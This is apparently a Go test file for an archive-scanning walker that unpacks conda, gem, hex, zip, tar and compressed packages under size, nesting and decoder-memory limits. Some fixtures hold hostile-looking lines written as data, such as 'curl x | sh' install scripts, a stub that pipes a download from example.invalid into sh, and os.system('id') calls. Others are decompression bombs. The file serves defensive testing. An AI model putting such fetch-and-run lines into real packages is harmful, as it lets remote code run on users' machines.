	}
	sort.Strings(names)
	for _, n := range names {
		w, _ := zw.Create(n)
		_, _ = w.Write(files[n])
	}
	_ = zw.Close()
	return buf.Bytes()
}

// The formats that nest an archive by definition are opened in place, with no
// option needed: their inner members ARE the package.
func TestWalkFormatDefinedNesting(t *testing.T) {
	t.Run("conda", func(t *testing.T) {
		conda := zipOf(map[string][]byte{
			"metadata.json":                  []byte(`{"conda_pkg_format_version": 2}`),
			"info-demo-1.0-py_0.tar.zst":     zstdOf(t, tarOf(map[string]string{"info/index.json": `{"name":"demo"}`, "info/recipe/meta.yaml": "package: demo\n"})),
			"pkg-demo-1.0-py_0.tar.zst":      zstdOf(t, tarOf(map[string]string{"bin/.demo-post-link.sh": "#!/bin/sh\ncurl x | sh\n", "lib/demo.py": "print(1)\n"})),
			"nested/pkg-other-1.0.tar.zst":   zstdOf(t, tarOf(map[string]string{"hidden": "x"})),
			"pkg-not-really.tar.zst":         []byte("not zstd at all"),
			"docs/readme-info-x.tar.zst.txt": []byte("plain"),
		})
		w := walkBytes(t, conda, testLimits, ArchiveOptions{})
		w.mustBeComplete(t, "zip")
		want := []string{
			"bin/.demo-post-link.sh", "docs/readme-info-x.tar.zst.txt", "info/index.json", "info/recipe/meta.yaml",
			"lib/demo.py", "metadata.json", "nested/pkg-other-1.0.tar.zst", "pkg-not-really.tar.zst",
		}
		if got := w.sortedNames(); !reflect.DeepEqual(got, want) {
			t.Fatalf("members = %v\n   want %v", got, want)
		}
		if w.content["bin/.demo-post-link.sh"] != "#!/bin/sh\ncurl x | sh\n" {
			t.Errorf("link script = %q", w.content["bin/.demo-post-link.sh"])
		}
		// Only a root member is the package's own inner archive; one in a
		// sub-directory, or one that is not an archive, stays an ordinary member.
		if w.content["pkg-not-really.tar.zst"] != "not zstd at all" {
			t.Errorf("non-archive member = %q", w.content["pkg-not-really.tar.zst"])
		}
	})

	t.Run("hex", func(t *testing.T) {
		hexPkg := tarOf(map[string]string{
			"VERSION":         "3",
			"CHECKSUM":        "ABCDEF",
			"metadata.config": "{<<\"name\">>,<<\"demo\">>}.\n",
			"contents.tar.gz": string(gzipOf(tarOf(map[string]string{"mix.exs": "defmodule Demo.MixProject do\nend\n", "lib/demo.ex": "IO.puts 1\n"}))),
		})
		w := walkBytes(t, hexPkg, testLimits, ArchiveOptions{})
		w.mustBeComplete(t, "tar")
		want := []string{"CHECKSUM", "VERSION", "lib/demo.ex", "metadata.config", "mix.exs"}
		if got := w.sortedNames(); !reflect.DeepEqual(got, want) {
			t.Fatalf("members = %v, want %v", got, want)
		}
		if w.content["mix.exs"] != "defmodule Demo.MixProject do\nend\n" {
			t.Errorf("mix.exs = %q", w.content["mix.exs"])
		}
	})

	t.Run("gem", func(t *testing.T) {
		gem := tarOf(map[string]string{
			"metadata.gz":       string(gzipOf([]byte("--- !ruby/object:Gem::Specification\nname: demo\n"))),
			"data.tar.gz":       string(gzipOf(tarOf(map[string]string{"lib/demo.rb": "puts 1\n", "ext/extconf.rb": "system('id')\n"}))),
			"checksums.yaml.gz": string(gzipOf([]byte("---\nSHA256: {}\n"))),
		})
		// By default only data.tar.gz is opened; the metadata stays as shipped.
		w := walkBytes(t, gem, testLimits, ArchiveOptions{})
		w.mustBeComplete(t, "tar")
		if got := w.sortedNames(); !reflect.DeepEqual(got, []string{"checksums.yaml.gz", "ext/extconf.rb", "lib/demo.rb", "metadata.gz"}) {
			t.Fatalf("members = %v", got)
		}
		// With nesting, the gemspec is readable under its uncompressed name.
		w = walkBytes(t, gem, testLimits, ArchiveOptions{NestedDepth: 1})
		w.mustBeComplete(t, "tar")
		if got := w.sortedNames(); !reflect.DeepEqual(got, []string{"checksums.yaml", "ext/extconf.rb", "lib/demo.rb", "metadata"}) {
			t.Fatalf("members with nesting = %v", got)
		}
		if w.content["metadata"] != "--- !ruby/object:Gem::Specification\nname: demo\n" {
			t.Errorf("metadata = %q", w.content["metadata"])
		}
	})
}

// An archive inside an archive is opened only on request, under "<member>!/",
// and only as deep as asked.
func TestWalkGenericNesting(t *testing.T) {
	innermost := zipOf(map[string][]byte{"deepest.txt": []byte("level 3")})
	inner := zipOf(map[string][]byte{"evil.sh": []byte("#!/bin/sh\ncurl x | sh\n"), "more.zip": innermost})
	outer := gzipOf(tarOf(map[string]string{
		"package/index.js":        "require('./lib')\n",
		"package/vendor/blob.zip": string(inner),
		"package/vendor/src.tgz":  string(gzipOf(tarOf(map[string]string{"a.c": "int main(){}\n"}))),
		"package/data.txt.gz":     string(gzipOf([]byte("inflated text\n"))),
		"package/photo.png":       "\x89PNG\r\n\x1a\nnot an archive",
	}))

	w := walkBytes(t, outer, testLimits, ArchiveOptions{})
	w.mustBeComplete(t, "tar.gz")
	if got := w.sortedNames(); !reflect.DeepEqual(got, []string{"package/data.txt.gz", "package/index.js", "package/photo.png", "package/vendor/blob.zip", "package/vendor/src.tgz"}) {
		t.Fatalf("no nesting: members = %v", got)
	}

	w = walkBytes(t, outer, testLimits, ArchiveOptions{NestedDepth: 1})
	w.mustBeComplete(t, "tar.gz")
	want := []string{
		"package/data.txt", "package/index.js", "package/photo.png",
		"package/vendor/blob.zip!/evil.sh", "package/vendor/blob.zip!/more.zip", "package/vendor/src.tgz!/a.c",
	}
	if got := w.sortedNames(); !reflect.DeepEqual(got, want) {
		t.Fatalf("depth 1: members = %v\n   want %v", got, want)
	}
	if w.content["package/vendor/blob.zip!/evil.sh"] != "#!/bin/sh\ncurl x | sh\n" || w.content["package/data.txt"] != "inflated text\n" {
		t.Errorf("nested content = %q / %q", w.content["package/vendor/blob.zip!/evil.sh"], w.content["package/data.txt"])
	}

	w = walkBytes(t, outer, testLimits, ArchiveOptions{NestedDepth: 2})
	if _, ok := w.content["package/vendor/blob.zip!/more.zip!/deepest.txt"]; !ok {
		t.Errorf("depth 2: members = %v", w.sortedNames())
	}
	if _, ok := w.content["package/vendor/blob.zip!/more.zip"]; ok {
		t.Error("an opened nested archive is also listed as an opaque member")
	}

	// The option is capped: nobody gets unbounded recursion by asking for it.
	chain := []byte("bottom")
	for i := 0; i < maxNestedDepth+3; i++ {
		chain = zipOf(map[string][]byte{"n.zip": chain})
	}
	w = walkBytes(t, chain, testLimits, ArchiveOptions{NestedDepth: 1000})
	deepest := 0
	for _, n := range w.names {
		if d := strings.Count(n, "!/"); d > deepest {
			deepest = d
		}
	}
	if deepest != maxNestedDepth {
		t.Errorf("nesting went %d levels deep, want exactly the cap %d (members %v)", deepest, maxNestedDepth, w.names)
	}
}

// The limits bound the whole artifact, nested archives included.
func TestWalkNestedArchivesShareTheLimits(t *testing.T) {
	files := map[string][]byte{}
	for i := 0; i < 30; i++ {
		files[fmt.Sprintf("f%02d.txt", i)] = []byte("x")
	}
	outer := zipOf(map[string][]byte{"a.txt": []byte("a"), "inner.zip": zipOf(files)})
	lim := testLimits
	lim.MaxFiles = 10
	w := walkBytes(t, outer, lim, ArchiveOptions{NestedDepth: 1})
	if len(w.names) >= 12 || !hasReason(w.stats, IncompleteFiles) {
		t.Errorf("file limit across nesting: %d files, incomplete=%v", len(w.names), w.stats.Incomplete)
	}

	// A decompression bomb hidden one level down trips the same byte cap.
	bomb := gzipOf(tarOf(map[string]string{"zeros": strings.Repeat("\x00", 3<<20)}))
	outer = gzipOf(tarOf(map[string]string{"pkg/payload.tgz": string(bomb), "pkg/readme": "hi"}))
	lim = testLimits
	lim.MaxUnpackedBytes = 1 << 20
	w = walkBytes(t, outer, lim, ArchiveOptions{NestedDepth: 2})
	if !hasReason(w.stats, IncompleteUnpackedBytes) {
		t.Errorf("nested bomb: incomplete = %v", w.stats.Incomplete)
	}

	// A nested zip too large to buffer is reported, and stays in the inventory.
	big := zipOf(map[string][]byte{"blob": bytes.Repeat([]byte{0x5a}, 64)})
	padded := append(append([]byte(nil), big...), make([]byte, nestedZipCap)...)
	hdr := tarOf(map[string]string{"huge.zip": string(padded)})
	lim = ArchiveLimits{MaxArchiveBytes: 64 << 20, MaxUnpackedBytes: 128 << 20, MaxFileBytes: 4096, MaxFiles: 100}
	w = walkBytes(t, hdr, lim, ArchiveOptions{NestedDepth: 1})
	if !hasReason(w.stats, IncompleteNestedFormat) {
		t.Errorf("oversized nested zip: incomplete = %v", w.stats.Incomplete)
	}
	if f, ok := w.files["huge.zip"]; !ok || !f.Truncated || f.Size != int64(len(padded)) {
		t.Errorf("oversized nested zip is not in the inventory: %+v (members %v)", f, w.names)
	}
}

func TestWalkSingleCompressedFile(t *testing.T) {
	for file, format := range map[string]string{"install.sh.gz": "gz", "install.sh.xz": "xz"} {
		// Not an archive unless the caller accepts a single file.
		w := walkBytes(t, fixture(t, file), testLimits, ArchiveOptions{Filename: file})
		if !errors.Is(w.err, ErrUnrecognizedArchive) || len(w.names) != 0 {
			t.Errorf("%s without SingleFile: err=%v members=%v", file, w.err, w.names)
		}
		w = walkBytes(t, fixture(t, file), testLimits, ArchiveOptions{Filename: file, SingleFile: true})
		w.mustBeComplete(t, format)
		if !reflect.DeepEqual(w.names, []string{"install.sh"}) || w.content["install.sh"] != "#!/bin/sh\necho single-file-marker\n" {
			t.Errorf("%s: members=%v content=%q", file, w.names, w.content["install.sh"])
		}
		if f := w.files["install.sh"]; f.Size != 34 || f.Truncated {
			t.Errorf("%s entry = %+v", file, f)
		}
	}

	// The name comes from the artifact's file name, without its directory; with
	// none to go by it is "content".
	gz := gzipOf([]byte("payload"))
	for name, want := range map[string]string{"": "content", "dir/sub/tool.gz": "tool", `C:\x\tool.bin.GZ`: "tool.bin", "plain": "plain", ".gz": ".gz"} {
		w := walkBytes(t, gz, testLimits, ArchiveOptions{Filename: name, SingleFile: true})
		if !reflect.DeepEqual(w.names, []string{want}) {
			t.Errorf("Filename %q: member = %v, want %q", name, w.names, want)
		}
	}

	// A single file larger than the per-file cap is cut and its real size kept.
	lim := testLimits
	lim.MaxFileBytes = 16
	w := walkBytes(t, gzipOf(bytes.Repeat([]byte("A"), 100)), lim, ArchiveOptions{Filename: "big.gz", SingleFile: true})
	if f := w.files["big"]; !f.Truncated || f.Size != 100 || len(w.content["big"]) != 16 || !hasReason(w.stats, IncompleteFileBytes) {
		t.Errorf("cut single file = %+v (%d bytes kept), incomplete=%v", f, len(w.content["big"]), w.stats.Incomplete)
	}

	// Compression inside compression is unwrapped, up to a fixed number of layers.
	layered := []byte("core\n")
	for i := 0; i < maxCompressionLayers; i++ {
		layered = gzipOf(layered)
	}
	w = walkBytes(t, layered, testLimits, ArchiveOptions{Filename: "x.gz.gz.gz", SingleFile: true})
	if !reflect.DeepEqual(w.names, []string{"x"}) || w.content["x"] != "core\n" || w.stats.Format != "gz.gz.gz" {
		t.Errorf("%d layers: members=%v content=%q format=%q", maxCompressionLayers, w.names, w.content["x"], w.stats.Format)
	}
	w = walkBytes(t, gzipOf(layered), testLimits, ArchiveOptions{Filename: "x.gz.gz.gz.gz", SingleFile: true})
	if w.content["x.gz"] == "core\n" || len(w.names) != 1 {
		t.Errorf("one layer too many was unwrapped: members=%v", w.names)
	}

	// An empty compressed stream is an archive with nothing in it, as it always
	// was; garbage after a valid signature is not an archive.
	w = walkBytes(t, gzipOf(nil), testLimits, ArchiveOptions{SingleFile: true})
	if w.err != nil || len(w.names) != 0 {
		t.Errorf("empty gzip: err=%v members=%v", w.err, w.names)
	}
	w = walkBytes(t, append([]byte{0x1f, 0x8b, 8, 0, 0, 0, 0, 0, 0, 3}, bytes.Repeat([]byte{0xff}, 64)...), testLimits, ArchiveOptions{SingleFile: true})
	if !errors.Is(w.err, ErrUnrecognizedArchive) {
		t.Errorf("corrupt gzip: err = %v", w.err)
	}
}

// The decoder's memory is the stream's to ask for and the walker's to refuse.
func TestDecoderMemoryIsBounded(t *testing.T) {
	good := fixture(t, "hello.tar.xz")
	if good[14] != xzFilterLZMA2 || good[15] != 1 {
		t.Fatalf("fixture layout changed: bytes 14..16 = % x", good[14:17])
	}
	// Byte 16 is the LZMA2 dictionary-size property of the first block.
	for prop, wantOK := range map[byte]bool{22: true, 28: true /* 64 MiB: xz -9 */, 29: false /* 96 MiB */, 40: false /* 4 GiB */} {
		patched := append([]byte(nil), good...)
		patched[16] = prop
		w := walkBytes(t, patched, testLimits, ArchiveOptions{})
		switch {
		case wantOK && (w.err != nil || len(w.names) != 2):
			t.Errorf("dictionary property %d: err=%v members=%v, want the archive formatWalk", prop, w.err, w.names)
		case !wantOK && !errors.Is(w.err, ErrDecoderMemory):
			t.Errorf("dictionary property %d: err=%v, want ErrDecoderMemory", prop, w.err)
		case !wantOK && len(w.names) != 0:
			t.Errorf("dictionary property %d: members were read: %v", prop, w.names)
		}
	}
	// 41 and above is not a size at all.
	patched := append([]byte(nil), good...)
	patched[16] = 41
	if w := walkBytes(t, patched, testLimits, ArchiveOptions{}); w.err == nil || errors.Is(w.err, ErrDecoderMemory) {
		t.Errorf("invalid dictionary property: err = %v", w.err)
	}

	// A filter chain other than LZMA2 (here x86 BCJ + LZMA2) is refused by name.
	if w := walkBytes(t, fixture(t, "hello-bcj.tar.xz"), testLimits, ArchiveOptions{}); !errors.Is(w.err, ErrUnsupportedFilter) {
		t.Errorf("BCJ filter chain: err = %v, want ErrUnsupportedFilter", w.err)
	}

	// A later block may not ask for more than the first one did: the cap is
	// checked per block. Two streams; the second one's block header is patched.
	two := append(append([]byte(nil), good...), good...)
	two[len(good)+16] = 40
	w := walkBytes(t, two, testLimits, ArchiveOptions{})
	if len(w.names) != 2 {
		t.Errorf("first stream of two: members = %v", w.names)
	}

	// The same refusal one level down is a note, not a failure of the walk.
	bad := append([]byte(nil), good...)
	bad[16] = 40
	outer := tarOf(map[string]string{"readme": "hi", "inner.tar.xz": string(bad)})
	w = walkBytes(t, outer, testLimits, ArchiveOptions{NestedDepth: 1})
	if w.err != nil || !hasReason(w.stats, IncompleteNestedFormat) || w.content["readme"] != "hi" {
		t.Errorf("nested refusal: err=%v incomplete=%v members=%v", w.err, w.stats.Incomplete, w.names)
	}
	if f, ok := w.files["inner.tar.xz"]; !ok || f.Size != int64(len(bad)) {
		t.Errorf("the refused nested archive is not in the inventory: %+v", f)
	}

	// zstd: a frame header declaring a 1 GiB window (window descriptor 0xA0),
	// followed by an empty last block.
	frame := []byte{0x28, 0xb5, 0x2f, 0xfd, 0x00, 0xa0, 0x01, 0x00, 0x00}
	w = walkBytes(t, frame, testLimits, ArchiveOptions{SingleFile: true})
	if !errors.Is(w.err, ErrDecoderMemory) {
		t.Errorf("zstd window of 1 GiB: err = %v, want ErrDecoderMemory", w.err)
	}

	// lzma (no container): a header asking for a 1 GiB dictionary.
	lz := []byte{0x5d, 0x00, 0x00, 0x00, 0x40, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00}
	w = walkBytes(t, lz, testLimits, ArchiveOptions{SingleFile: true})
	if !errors.Is(w.err, ErrDecoderMemory) {
		t.Errorf("lzma dictionary of 1 GiB: err = %v, want ErrDecoderMemory", w.err)
	}
}

// xzOfBlocks hand-builds an xz stream of n blocks, each holding one stored
// byte and asking for the dictionary size the property byte names. With
// declare set, each block header also states its uncompressed size (1).
func xzOfBlocks(n int, dictProp byte, declare bool) []byte {
	var b bytes.Buffer
	b.WriteString("\xfd7zXZ\x00\x00\x00\x00\x00\x00\x00") // check type "none"; CRCs are not verified
	for i := 0; i < n; i++ {
		if declare {
			b.Write([]byte{0x02, 0x80, 0x01, xzFilterLZMA2, 0x01, dictProp, 0, 0, 0, 0, 0, 0})
		} else {
			b.Write([]byte{0x02, 0x00, xzFilterLZMA2, 0x01, dictProp, 0, 0, 0, 0, 0, 0, 0})
		}
		// One LZMA2 chunk: stored, with dictionary reset, one byte; then the end marker.
		b.Write([]byte{0x01, 0x00, 0x00, 'x', 0x00})
		b.Write([]byte{0, 0, 0}) // block padding to a multiple of four
	}
	// Index: indicator, record count, one (unpadded size, uncompressed size) pair
	// per block, padding, CRC32. Then the 12-byte footer.
	idx := []byte{0x00}
	for v := uint64(n); ; {
		c := byte(v & 0x7f)
		if v >>= 7; v != 0 {
			idx = append(idx, c|0x80)
			continue
		}
		idx = append(idx, c)
		break
	}
	for i := 0; i < n; i++ {
		idx = append(idx, 17, 1)
	}
	for len(idx)%4 != 0 {
		idx = append(idx, 0)
	}
	b.Write(idx)
	b.Write(make([]byte, 4+12))
	return b.Bytes()
}

// A stream may name any number of blocks, and each block names its own
// dictionary. Allocating a maximum-size dictionary per empty block is work no
// real archive asks for.
func TestXZBlockDictionariesAreProportionate(t *testing.T) {
	decode := func(data []byte) (string, error) {
		x, err := newXZReader(bufioReader(data), maxLZMADictBytes)
		if err != nil {
			return "", err
		}
		out, err := io.ReadAll(x)
		return string(out), err
	}

	// Sanity: the hand-built stream is one the decoder accepts.
	if out, err := decode(xzOfBlocks(3, 0, false)); err != nil || out != "xxx" {
		t.Fatalf("3 small-dictionary blocks decoded to %q, %v", out, err)
	}
	// Any number of blocks with a small dictionary is fine.
	if out, err := decode(xzOfBlocks(2000, 0, false)); err != nil || len(out) != 2000 {
		t.Errorf("2000 small-dictionary blocks decoded to %d bytes, %v", len(out), err)
	}

	// Blocks that each ask for 64 MiB while producing one byte: the allowance
	// covers the first few, and nothing after that.
	out, err := decode(xzOfBlocks(1000, 28, false))
	if !errors.Is(err, errDictTooLarge) {
		t.Fatalf("1000 blocks of 64 MiB dictionaries: err = %v, want the memory refusal", err)
	}
	if len(out) != xzFreeDictionaries {
		t.Errorf("%d blocks were decoded before the refusal, want %d", len(out), xzFreeDictionaries)
	}

	// The same blocks, each stating that it holds one byte, need no such
	// dictionary and are all decoded.
	if out, err := decode(xzOfBlocks(1000, 28, true)); err != nil || len(out) != 1000 {
		t.Errorf("1000 size-declaring blocks decoded to %d bytes, %v", len(out), err)
	}

	// Through the walker the refusal is a broken stream: what was decoded is
	// reported, and the walk says it is incomplete.
	w := walkBytes(t, xzOfBlocks(1000, 28, false), testLimits, ArchiveOptions{Filename: "blob.xz", SingleFile: true})
	if w.err != nil || w.content["blob"] != strings.Repeat("x", xzFreeDictionaries) || !hasReason(w.stats, IncompleteMalformed) {
		t.Errorf("walk: err=%v content=%q incomplete=%v", w.err, w.content["blob"], w.stats.Incomplete)
	}
}

func TestXZDictionaryFor(t *testing.T) {
	const max = 64 << 20
	x := &xzReader{maxDict: max}
	// Clamped to the block's stated size, never below the decoder's minimum.
	for _, tc := range []struct{ dict, size, want int64 }{
		{8 << 20, -1, 8 << 20},
		{8 << 20, 1 << 20, 1 << 20},
		{8 << 20, 16 << 20, 8 << 20},
		{8 << 20, 0, 4096},
		{1 << 10, -1, 4096},
	} {
		y := *x
		got, err := y.dictionaryFor(tc.dict, tc.size)
		if err != nil || got != tc.want || y.allocated != tc.want {
			t.Errorf("dictionaryFor(%d, %d) = %d, %v (allocated %d); want %d", tc.dict, tc.size, got, err, y.allocated, tc.want)
		}
	}
	// The allowance: exactly xzFreeDictionaries maximum-size dictionaries for
	// free, further ones only against decoded output.
	for i := 0; i < xzFreeDictionaries; i++ {
		if _, err := x.dictionaryFor(max, -1); err != nil {
			t.Fatalf("dictionary %d of the free allowance was refused: %v", i+1, err)
		}
	}
	if _, err := x.dictionaryFor(max, -1); !errors.Is(err, errDictTooLarge) {
		t.Errorf("a dictionary beyond the allowance: err = %v", err)
	}
	x.produced = max/xzDictPerOutput - 1
	if _, err := x.dictionaryFor(max, -1); !errors.Is(err, errDictTooLarge) {
		t.Errorf("one byte short of paying for a dictionary: err = %v", err)
	}
	x.produced = max / xzDictPerOutput
	if _, err := x.dictionaryFor(max, -1); err != nil {
		t.Errorf("a dictionary paid for by decoded output was refused: %v", err)
	}
}

// With random access a zip is read from its directory, not buffered: one that
// is larger than the input cap still yields its inventory and its small members.
func TestWalkZipThroughRandomAccess(t *testing.T) {
	big := bytes.Repeat([]byte("0123456789abcdef"), 1<<16) // 1 MiB that deflates to almost nothing
	rand := make([]byte, 300<<10)                          // incompressible: a xorshift sequence
	for i, x := 0, uint32(2463534242); i < len(rand); i++ {
		x ^= x << 13
		x ^= x >> 17
		x ^= x << 5
		rand[i] = byte(x)
	}
	archive := zipOf(map[string][]byte{
		"pkg/setup.py":          []byte("import os\nos.system('id')\n"),
		"pkg/lib/native.so":     rand,
		"pkg/data/big.txt":      big,
		"pkg/inner.zip":         zipOf(map[string][]byte{"hidden.sh": []byte("#!/bin/sh\n")}),
		"pkg/EGG-INFO/PKG-INFO": []byte("Name: pkg\n"),
	})
	lim := ArchiveLimits{MaxArchiveBytes: 64 << 10, MaxUnpackedBytes: 16 << 20, MaxFileBytes: 4096, MaxFiles: 100, MaxCompressionRatio: 10000}
	if int64(len(archive)) <= lim.MaxArchiveBytes {
		t.Fatalf("the fixture (%d bytes) must be larger than the input cap", len(archive))
	}

	// From the stream alone it cannot be opened: the directory is past the cap.
	w := walkBytes(t, archive, lim, ArchiveOptions{})
	if len(w.names) != 0 || !hasReason(w.stats, IncompleteArchiveBytes) {
		t.Fatalf("buffered walk of an oversized zip: members=%v incomplete=%v", w.names, w.stats.Incomplete)
	}

	opts := ArchiveOptions{ReaderAt: bytes.NewReader(archive), Size: int64(len(archive)), NestedDepth: 1}
	w = walkBytes(t, archive, lim, opts)
	if w.err != nil || w.stats.Format != "zip" {
		t.Fatalf("random-access walk: err=%v format=%q", w.err, w.stats.Format)
	}
	want := []string{"pkg/EGG-INFO/PKG-INFO", "pkg/data/big.txt", "pkg/inner.zip!/hidden.sh", "pkg/lib/native.so", "pkg/setup.py"}
	if got := w.sortedNames(); !reflect.DeepEqual(got, want) {
		t.Fatalf("members = %v\n   want %v", got, want)
	}
	if w.content["pkg/setup.py"] != "import os\nos.system('id')\n" || w.content["pkg/inner.zip!/hidden.sh"] != "#!/bin/sh\n" {
		t.Errorf("content = %q / %q", w.content["pkg/setup.py"], w.content["pkg/inner.zip!/hidden.sh"])
	}
	if f := w.files["pkg/data/big.txt"]; f.Size != int64(len(big)) || !f.Truncated || len(w.content["pkg/data/big.txt"]) != 4096 {
		t.Errorf("large member = %+v", f)
	}
	// The stream contributed only the bytes needed to recognize the format; the
	// rest was read at random, and both are accounted for.
	if hasReason(w.stats, IncompleteArchiveBytes) || hasReason(w.stats, IncompleteRatio) {
		t.Errorf("incomplete = %v", w.stats.Incomplete)
	}
	if w.stats.CompressedBytes <= 0 || w.stats.CompressedBytes > int64(len(archive))+8192 {
		t.Errorf("compressed bytes accounted = %d for a %d-byte archive", w.stats.CompressedBytes, len(archive))
	}

	// The limits still hold: members, decompressed bytes, the ratio guard.
	small := lim
	small.MaxFiles = 2
	w = walkBytes(t, archive, small, opts)
	if len(w.names) > 2 || !hasReason(w.stats, IncompleteFiles) {
		t.Errorf("member limit: %d members, incomplete=%v", len(w.names), w.stats.Incomplete)
	}
	// (A member is only inflated as far as it is kept, so the byte limits bite
	// once the per-file cap lets a large member through.)
	small = lim
	small.MaxFileBytes = 8 << 20
	small.MaxUnpackedBytes = 256 << 10
	w = walkBytes(t, archive, small, opts)
	if !hasReason(w.stats, IncompleteUnpackedBytes) {
		t.Errorf("decompression limit: incomplete=%v", w.stats.Incomplete)
	}
	bomb := zipOf(map[string][]byte{"zeros": make([]byte, 8<<20), "pad": rand})
	tight := lim
	tight.MaxFileBytes = 16 << 20
	tight.MaxCompressionRatio = 5
	w = walkBytes(t, bomb, tight, ArchiveOptions{ReaderAt: bytes.NewReader(bomb), Size: int64(len(bomb))})
	if !hasReason(w.stats, IncompleteRatio) {
		t.Errorf("ratio guard through random access: incomplete=%v", w.stats.Incomplete)
	}

	// A directory with far more records than the member limit allows is refused
	// without being materialized.
	many := map[string][]byte{}
	for i := 0; i < 600; i++ {
		many[fmt.Sprintf("a-rather-long-member-name-to-fill-the-directory/%04d.txt", i)] = nil
	}
	flood := zipOf(many)
	tiny := ArchiveLimits{MaxArchiveBytes: 1 << 10, MaxUnpackedBytes: 1 << 20, MaxFileBytes: 1024, MaxFiles: 1}
	// zipDirectorySlack tolerates a few thousand records; shrink the room instead
	// by making the directory larger than its byte allowance.
	budget := int64(4*tiny.MaxFiles+zipDirectorySlack)*zipDirectoryEntryBytes + 256<<10
	for int64(len(flood)) < 2*budget {
		for i, end := len(many), len(many)+4000; i < end; i++ {
			many[fmt.Sprintf("a-rather-long-member-name-to-fill-the-directory/%06d.txt", i)] = nil
		}
		flood = zipOf(many)
	}
	w = walkBytes(t, flood, tiny, ArchiveOptions{ReaderAt: bytes.NewReader(flood), Size: int64(len(flood))})
	if len(w.names) != 0 || !hasReason(w.stats, IncompleteZipDirectory) {
		t.Errorf("directory flood: members=%d incomplete=%v err=%v", len(w.names), w.stats.Incomplete, w.err)
	}

	// Not a zip behind the signature: an error, as on the buffered path.
	junk := append([]byte("PK\x03\x04"), bytes.Repeat([]byte{0x55}, 4096)...)
	if w := walkBytes(t, junk, lim, ArchiveOptions{ReaderAt: bytes.NewReader(junk), Size: int64(len(junk))}); w.err == nil {
		t.Error("junk behind a zip signature was walked as an archive")
	}
	// Other formats ignore the random-access handle and read the stream.
	deb := fixture(t, "pthello-xz.deb")
	if w := walkBytes(t, deb, testLimits, ArchiveOptions{ReaderAt: bytes.NewReader(deb), Size: int64(len(deb))}); w.stats.Format != "deb" || len(w.names) != 8 {
		t.Errorf("deb with a random-access handle: format=%q members=%d", w.stats.Format, len(w.names))
	}
}

// A zip is found from its end, so installers unpack one that has other bytes in
// front of it. The walker must not call such a file "not an archive".
func TestWalkPrefixedZip(t *testing.T) {
	wheel := zipOf(map[string][]byte{
		"demo/__init__.py":            []byte("import os\nos.system('id')\n"),
		"demo-1.0.dist-info/METADATA": []byte("Name: demo\n"),
	})
	stub := []byte("#!/bin/sh\ncurl -s http://example.invalid/x | sh\nexec python3 \"$0\" \"$@\"\n")
	for name, prefix := range map[string][]byte{
		"launcher stub": stub,
		"text padding":  bytes.Repeat([]byte("This is not an archive. "), 64),
		"one byte":      {'x'},
	} {
		t.Run(name, func(t *testing.T) {
			data := append(append([]byte(nil), prefix...), wheel...)
			if Recognizes(data) {
				t.Fatal("the fixture starts like an archive; it must not, for this test to mean anything")
			}
			// With or without the single-file option: it is an archive.
			for _, single := range []bool{false, true} {
				w := walkBytes(t, data, testLimits, ArchiveOptions{Filename: "demo-1.0-py3-none-any.whl", SingleFile: single})
				w.mustBeComplete(t, "zip")
				want := []string{PrefixEntryName, "demo-1.0.dist-info/METADATA", "demo/__init__.py"}
				if got := w.sortedNames(); !reflect.DeepEqual(got, want) {
					t.Fatalf("single=%v: members = %v, want %v", single, got, want)
				}
				if w.content["demo/__init__.py"] != "import os\nos.system('id')\n" {
					t.Errorf("member content = %q", w.content["demo/__init__.py"])
				}
				if w.stats.PrefixBytes != int64(len(prefix)) {
					t.Errorf("PrefixBytes = %d, want %d", w.stats.PrefixBytes, len(prefix))
				}
				// What sits in front of the archive is shown, marked as composed.
				if f := w.files[PrefixEntryName]; !f.Synthetic || f.Size != int64(len(prefix)) || w.content[PrefixEntryName] != string(prefix) {
					t.Errorf("prefix entry = %+v, content %q", f, w.content[PrefixEntryName])
				}
			}
		})
	}

	// An ordinary zip reports no prefix and no prefix entry.
	w := walkBytes(t, wheel, testLimits, ArchiveOptions{})
	if w.stats.PrefixBytes != 0 || len(w.names) != 2 {
		t.Errorf("ordinary zip: prefix=%d members=%v", w.stats.PrefixBytes, w.names)
	}

	// The same through random access, for a zip larger than the input cap.
	big := zipOf(map[string][]byte{"pkg/a.py": []byte("print(1)\n"), "pkg/blob.bin": bytes.Repeat([]byte{0xA5, 0x5A, 0x3C}, 200<<10)})
	big = append(append([]byte(nil), stub...), big...)
	lim := ArchiveLimits{MaxArchiveBytes: 4 << 10, MaxUnpackedBytes: 8 << 20, MaxFileBytes: 4096, MaxFiles: 100, MaxCompressionRatio: 100000}
	w = walkBytes(t, big, lim, ArchiveOptions{ReaderAt: bytes.NewReader(big), Size: int64(len(big))})
	if w.err != nil || w.stats.Format != "zip" || w.content["pkg/a.py"] != "print(1)\n" {
		t.Fatalf("random-access prefixed zip: err=%v format=%q members=%v", w.err, w.stats.Format, w.names)
	}
	if w.stats.PrefixBytes < int64(len(stub)) {
		t.Errorf("random-access PrefixBytes = %d, want at least the %d-byte stub", w.stats.PrefixBytes, len(stub))
	}

	// The end-of-directory signature alone does not make a zip.
	fake := append(bytes.Repeat([]byte("plain text\n"), 50), []byte("PK\x05\x06 not really")...)
	w = walkBytes(t, fake, testLimits, ArchiveOptions{Filename: "notes.txt"})
	if !errors.Is(w.err, ErrUnrecognizedArchive) || len(w.names) != 0 {
		t.Errorf("fake trailer: err=%v members=%v", w.err, w.names)
	}
	w = walkBytes(t, fake, testLimits, ArchiveOptions{Filename: "notes.txt", SingleFile: true})
	if w.err != nil || !reflect.DeepEqual(w.names, []string{"notes.txt"}) || w.stats.Format != "file" || w.stats.PrefixBytes != 0 {
		t.Errorf("fake trailer as a single file: err=%v members=%v format=%q", w.err, w.names, w.stats.Format)
	}
}

// Content that is no container at all is one file, when the caller says a
// single file is what the artifact may be — and not an archive otherwise.
func TestWalkPlainSingleFile(t *testing.T) {
	script := []byte("from conan import ConanFile\nclass Demo(ConanFile):\n    pass\n")
	w := walkBytes(t, script, testLimits, ArchiveOptions{Filename: "conanfile.py"})
	if !errors.Is(w.err, ErrUnrecognizedArchive) || len(w.names) != 0 {
		t.Fatalf("without SingleFile: err=%v members=%v", w.err, w.names)
	}
	w = walkBytes(t, script, testLimits, ArchiveOptions{Filename: "dir/conanfile.py", SingleFile: true})
	w.mustBeComplete(t, "file")
	if !reflect.DeepEqual(w.names, []string{"conanfile.py"}) || w.content["conanfile.py"] != string(script) {
		t.Fatalf("single file: members=%v content=%q", w.names, w.content["conanfile.py"])
	}
